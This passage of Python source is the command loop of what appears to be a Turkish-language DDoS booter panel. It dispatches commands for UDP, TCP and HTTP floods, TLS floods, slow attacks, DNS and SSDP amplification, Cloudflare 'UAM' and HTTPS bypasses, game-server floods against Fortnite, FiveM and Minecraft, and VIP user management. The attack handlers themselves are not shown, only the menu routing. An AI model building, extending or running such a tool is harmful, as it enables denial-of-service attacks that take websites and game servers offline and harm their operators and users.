            cmd = parts[0].lower()
            args = parts[1:]

            if cmd in ("exit", "quit", "q"):
                break
            elif cmd == "help":
                cmd_help()
            elif cmd == "menu":
                cmd_menu()
            elif cmd in ("l7", "layer7"):
                cmd_menu()
            elif cmd in ("l4", "layer4"):
                cmd_menu()
            elif cmd == "game":
                cmd_menu()
            elif cmd == "udp":
                cmd_udp(args)
            elif cmd == "httpflood":
                cmd_httpflood(args)
            elif cmd == "cfpro":
                cmd_cfpro(args)
            elif cmd == "flood":
                cmd_flood(args)
            elif cmd == "http-raw":
                cmd_httpraw(args)
            elif cmd == "http-socket":
                cmd_httpsocket(args)
            elif cmd == "http-rand":
                cmd_httprand(args)
            elif cmd == "https-spoof":
                cmd_httpspoof(args)
            elif cmd == "tls":
                cmd_tls(args)
            elif cmd == "tls2":
                cmd_tls2(args)
            elif cmd == "tls3":
                cmd_tls3(args)
            elif cmd == "httpflood2":
                cmd_httpflood2(args)
            elif cmd == "slow":
                cmd_slow(args)
            elif cmd == "tcpflood":
                cmd_tcpflood(args)
            elif cmd == "fortnite":
                cmd_fortnite(args)
            elif cmd == "fivem":
                cmd_fivem(args)
            elif cmd == "browser":
                cmd_browser(args)
            elif cmd == "minecraft":
                cmd_minecraft(args)
            elif cmd == "dnsamp":
                cmd_dnsamp(args)
            elif cmd == "ssdp":
                cmd_ssdp(args)
            elif cmd == "rapid":
                cmd_rapid(args)
            elif cmd == "uambypass":
                cmd_uambypass(args)
            elif cmd == "httpsbypass":
                cmd_httpsbypass(args)
            elif cmd == "info":
                cmd_info(args)
            elif cmd == "promptstyle":
                cmd_promptstyle(args)
            elif cmd == "promptcolor":
                cmd_promptcolor(args)
            elif cmd == "theme":
                cmd_theme(args)
            elif cmd == "addvip":
                cmd_addvip(args)
            elif cmd == "delvip":
                cmd_delvip(args)
            elif cmd == "listvip":
                cmd_listvip(args)
            elif cmd == "stop":
                cmd_stop()
            elif cmd == "clear":
                show_logo()
            elif cmd == "history":
                history_listele()
            else:
                print(f"[!] Bilinmeyen komut: '{cmd}'. 'help' yazın.")
    except KeyboardInterrupt:
        print("\nÇıkılıyor...")
        sys.exit(0)

if __name__ == "__main__":
    main()